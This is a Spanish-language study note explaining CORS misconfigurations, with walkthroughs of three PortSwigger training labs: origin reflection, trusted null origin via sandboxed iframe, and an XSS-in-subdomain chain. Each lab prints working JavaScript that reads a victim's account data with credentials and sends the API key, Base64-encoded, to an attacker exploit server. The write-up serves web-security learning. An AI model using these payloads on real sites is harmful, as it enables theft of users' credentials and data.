---
aliases:
  - CORS
  - Cross-Origin Resource Sharing
tags:
  - hacking/web
  - hacking/laboratorios
estado: 🟢 Terminado
---
# Intercambio de Recursos de Origen Cruzado (CORS)

El **Intercambio de Recursos de Origen Cruzado** (**CORS**) es un mecanismo que permite que un servidor web **restrinja** el **acceso a recursos** de **diferentes orígenes**, es decir, de diferentes dominios o protocolos. CORS se utiliza para proteger la privacidad y seguridad de los usuarios, evitando que otros sitios web accedan a información confidencial sin permiso.

> [!info] Propósito de CORS
> CORS es una característica de seguridad implementada por los navegadores web para controlar cómo los recursos de una página web pueden ser solicitados desde un dominio diferente al que sirvió la primera página. Sin CORS, las políticas de seguridad del navegador (como la Política del Mismo Origen, SOP) bloquearían estas solicitudes por defecto, previniendo ataques como la falsificación de solicitudes entre sitios (CSRF) y el robo de datos.

Supongamos una aplicación web en el dominio `example.com` que utiliza una API web en el dominio `api.example.com` para recuperar datos. Si la aplicación web está correctamente configurada para CORS, solo permitirá solicitudes de origen cruzado desde el dominio `example.com` a la API en el dominio `api.example.com`. Si se realiza una solicitud desde un dominio diferente, como `attacker.com`, la solicitud será bloqueada por el navegador web.

Sin embargo, si la aplicación web no está correctamente configurada para CORS, un atacante podría aprovechar esta debilidad para acceder a recursos y datos confidenciales. Por ejemplo, si la aplicación web no valida la autorización del usuario para acceder a los recursos, un atacante podría inyectar código malicioso en una página web para realizar solicitudes a la API de la aplicación en el dominio `api.example.com`.

> [!warning] Riesgos de una mala configuración CORS
> Una configuración CORS deficiente puede llevar a la exposición de datos sensibles, la ejecución de acciones no autorizadas en nombre del usuario, o incluso la toma de control de cuentas. Esto ocurre cuando el servidor permite orígenes arbitrarios o nulos, o cuando confía en protocolos inseguros o subdominios no controlados.

El atacante podría utilizar herramientas automatizadas para probar diferentes valores de encabezados CORS y encontrar una configuración incorrecta que permita la solicitud desde otro dominio. Si el atacante tiene éxito, podría acceder a recursos y datos confidenciales que no deberían estar disponibles desde su sitio web. Por ejemplo, podría recuperar la información de inicio de sesión de los usuarios o modificar los datos de la aplicación.

Para prevenir este tipo de ataque, es crucial configurar adecuadamente CORS en la aplicación web y asegurarse de que solo se permitan solicitudes de origen cruzado desde dominios confiables.

## PortSwigger

### Lab: CORS vulnerability with basic origin reflection

Se tiene una configuración de CORS insegura, donde tenemos que obtener la API key del administrador.
Podemos hacer login con `wiener:peter`:
![[Pasted image 20250915085610.png]]

Vemos que al ingresar nos carga la API key, no es inmediata por lo que por seguridad podemos esperar un tiempo antes de obtenerla.

El concepto es que se pueda aprovechar de sesiones activas donde, mediante el arrastrar la cookie o lo que sea necesario para mantener la sesión activa, vamos a realizar acciones como el usuario. En sí, la mala configuración del CORS lo permite.

Vamos a recargar la web que carga la API Key para capturar y ver qué se está tramitando:
![[Pasted image 20250915090526.png]]

Al parecer se tramita una segunda petición a `accountDetails` y vamos a ver su respuesta:
![[Pasted image 20250915090653.png]]

Vemos todos los datos de la cuenta en formato JSON. Además, también vemos en la petición `Access-Control-Allow-Credentials: true` y esto le dice al navegador si exponer la respuesta del código JavaScript, además permite que el navegador envíe cookies, tokens de sesión u otros datos en la solicitud.

> [!warning] `Access-Control-Allow-Credentials: true`
> Este encabezado es crítico. Cuando se establece en `true`, permite que el navegador envíe y reciba cookies de autenticación, encabezados HTTP de autorización o certificados TLS del cliente en solicitudes de origen cruzado. Si se combina con un `Access-Control-Allow-Origin` que permite orígenes arbitrarios o controlados por el atacante, se convierte en una vulnerabilidad grave, ya que un atacante puede realizar solicitudes autenticadas en nombre del usuario.

Bueno, cuando nosotros creemos la web maliciosa, al realizar la petición se debería agregar un encabezado llamado `Origin` el cual indica desde dónde se tramita la solicitud. No lo vemos en la petición de la captura debido a que, al ser del mismo origen, no lo necesita, pero podemos intentar agregarlo y ver qué sucede:

![[Pasted image 20250915091412.png]]

Vemos que se agrega en la respuesta y esto es un problema ya que se está contemplando como que cualquier valor u origen sea válido y esto, con el `true` del control de acceso, provoca el CORS.

> [!tip] Reflejo del encabezado `Origin`
> Si el servidor refleja el valor del encabezado `Origin` directamente en el encabezado `Access-Control-Allow-Origin` de la respuesta, indica una configuración vulnerable. Esto significa que cualquier origen que el atacante especifique será considerado "permitido" por el servidor, abriendo la puerta a ataques de origen cruzado.

Entonces el código y la idea detrás del mismo será la siguiente:
```html
<script>
  var req = new XMLHttpRequest();
  req.open("GET", "https://0a860017042ab7a080c50d680057007c.web-security-academy.net/my-account/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

La lógica es crear una petición de forma asíncrona a la ruta que nos retorna los datos y para jugar o arrastrar las credenciales válidas que se emplean ya almacenadas usamos `withCredentials=true` antes de enviar la solicitud. Veámoslo:
![[Pasted image 20250915092410.png]]

![[Pasted image 20250915092635.png]]

Parece que funciona. Ahora el objetivo es enviarnos estos datos de la respuesta a nosotros. Para hacerlo vamos a hacer lo siguiente en nuestro código:
```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location = "https://exploit1a9200220415b76580890c0f0185006d.exploit-server.net/?apikey=" + btoa(req.responseText);
  }
  req.open("GET", "https://0a860017042ab7a080c50d680057007c.web-security-academy.net/my-account/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

Lo que aumentamos es el `req.onload` el cual solo se ejecuta luego de cargar la solicitud por completo y, mediante una función, lo que hacemos es con `location` enviar una petición al servidor del atacante el contenido de la respuesta en Base64.

Vemos si esto funciona:
![[Pasted image 20250915093150.png]]

![[Pasted image 20250915100527.png]]
Revisando los logs, pues sí funcionó y ya con esto veamos si se tramita el contenido de nuestro usuario:
![[Pasted image 20250915100659.png]]
Perfecto, ahora ya podemos hacer lo mismo para la víctima y vemos qué obtenemos:
![[Pasted image 20250915100810.png]]
Ahora con esto podemos completar la máquina:
![[Pasted image 20250915100846.png]]
Lab Terminado.

### Lab: CORS vulnerability with trusted null origin

El objetivo es el mismo, pero al parecer podemos enviar un origen nulo.

Volvemos a capturar peticiones y vemos lo mismo:
![[Pasted image 20250915110738.png]]
El `Access-Control-Allow-Credentials: true` ya nos está dando un indicio de que podrían acontecerse orígenes cruzados.

Vamos a intentar enviar `Origin` a ver qué sucede:
![[Pasted image 20250915110928.png]]

No nos refleja el origen en la cabecera, por lo que no está admitiendo cualquier origen. Así que vamos a intentar con origen nulo a ver qué sucede:
![[Pasted image 20250915111045.png]]

Perfecto, vemos que si enviamos un origen nulo funciona, ya vemos la cabecera. En este punto tenemos que encontrar la forma de enviar un origen `null`.

Ahora, este origen `null` no lo podemos definir de forma directa, pero con ayuda de `iframe` y un truquito lo podemos hacer. El concepto es sencillo, en realidad vamos a jugar con el `iframe` y le definimos con un `sandbox` permisos mínimos los cuales solo interpreten código JavaScript. Luego tenemos algo llamado `srcdoc` el cual nos permite definir contenido dentro del `iframe` y aquí es donde se acontece el `null` debido a dos conceptos: el contenido dentro de un `srcdoc` se considera como un origen único/nulo por seguridad, además el `sandbox` también impone restricciones que afectan al mismo origen.

> [!info] Origen Nulo con `iframe` y `srcdoc`
> Un `iframe` con el atributo `sandbox` y contenido definido por `srcdoc` crea un contexto de navegación con un "origen nulo". Esto se debe a que el contenido de `srcdoc` no tiene una URL asociada y el `sandbox` aísla aún más el contenido, haciendo que el navegador le asigne un origen único y opaco (null). Si el servidor CORS confía en el origen `null`, un atacante puede explotar esto para realizar solicitudes de origen cruzado.

Entendiendo eso, podemos aprovecharnos para definir el origen `null` de la siguiente manera:
```html
<iframe sandbox="allow-scripts" srcdoc='<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
  location = "https://exploit-0a92000504b3a86b8294e7ea01350069.exploit-server.net/?apiKey=" + btoa(req.responseText);
  };
  req.open("GET", "https://0a82005b0487a8638271e8fc00c000a3.web-security-academy.net/accountDetails", true);
  req.withCredentials = true;
  req.send();
  </script>'></iframe>
```

Como vemos, usamos el `sandbox` y el `srcdoc` para enviar un origen `null`. Vemos qué sucede:
![[Pasted image 20250915113220.png]]
![[Pasted image 20250915113246.png]]

Obtenemos resultado, vemos el contenido:
![[Pasted image 20250915113323.png]]
Perfecto, podemos completar el lab.
![[Pasted image 20250915113401.png]]

Lab Terminado.

### Lab: CORS vulnerability with trusted insecure protocols

En este caso se acontece un CORS donde por alguna razón se confía en todos los dominios sin importar el protocolo y de igual forma tenemos que conseguir la `ApiKey` del administrador.

![[Pasted image 20250915114853.png]]

Tanto lo que es `Origin` de otro tipo o nulos no funcionan. Nos está hablando de subdominios. Si probamos con el dominio de la misma web, veamos qué pasa:
![[Pasted image 20250915115010.png]]
Perfecto, sí es permitido tanto `http` como `https`. Podemos tratar de ver agregando cosas como `https://test....`:
![[Pasted image 20250915115108.png]]
Esto nos lo permite, por lo que por subdominios nos lo permite. Entonces tenemos que de alguna forma encontrar algún subdominio.
![[Pasted image 20250915115216.png]]
Al verificar por cosas disponibles de la que tenemos, vemos que nos envía a otra ventana:
![[Pasted image 20250915115255.png]]

Perfecto, vemos otro dominio. Ahora vemos en la URL que se maneja por identificador. Podemos intentar colarle allí una inyección XSS:
![[Pasted image 20250915115542.png]]
Lo interpreta y sí es completamente vulnerable.

> [!warning] Combinación de XSS y CORS
> La combinación de una vulnerabilidad XSS en un subdominio confiable y una política CORS permisiva para ese subdominio (incluso con diferentes protocolos) es extremadamente peligrosa. El XSS permite al atacante ejecutar código JavaScript arbitrario en el contexto del subdominio, y la política CORS permite que ese código realice solicitudes autenticadas a la API principal, eludiendo la Política del Mismo Origen.

En este punto podemos ver si este dominio nos lo contempla para usarlo en el `Origin`:
![[Pasted image 20250915115644.png]]
Excelente, sí se contempla.

Con esto vamos a dejar claro cómo se va a interactuar: vamos a primero redirigir al usuario a la web donde tenemos la inyección XSS y desde allí con el XSS vamos a realizar la inyección para extraer la `ApiKey` del usuario admin. Entonces vemos cómo queda el código malicioso de la web:
```html
<script>
document.location = "http://stock.0ac300b9038e41a18141257700b400a9.web-security-academy.net/?productId=%3Cscript%3Evar%20req%20=%20new%20XMLHttpRequest();req.onload%20=%20function%20()%20{location%20=%27https://exploit-0a6c004a031f41c581a924cc01be004e.exploit-server.net/?apiKey=%27%20%2b%20btoa(req.responseText);};req.open(%27GET%27,%20%22https://0ac300b9038e41a18141257700b400a9.web-security-academy.net/accountDetails%22,%20true);req.withCredentials%20=%20true;req.send();%3C/script%3E&storeId=2";
</script>
```

Lo que tenemos dentro del `location` está URL-encoded, pero sería la inyección de la siguiente manera:
```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    location =
      'https://exploit-0a6c004a031f41c581a924cc01be004e.exploit-server.net/?apiKey=' + btoa(req.responseText);
  };
  req.open('GET', "https://0ac300b9038e41a18141257700b400a9.web-security-academy.net/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

Bueno, enviamos esto y vemos que recibimos la petición en el log:
![[Pasted image 20250915122549.png]]
![[Pasted image 20250915122556.png]]
Lo desciframos y vemos lo siguiente:
![[Pasted image 20250915122628.png]]
Completamos la máquina:
![[Pasted image 20250915122652.png]]

Lab Terminado.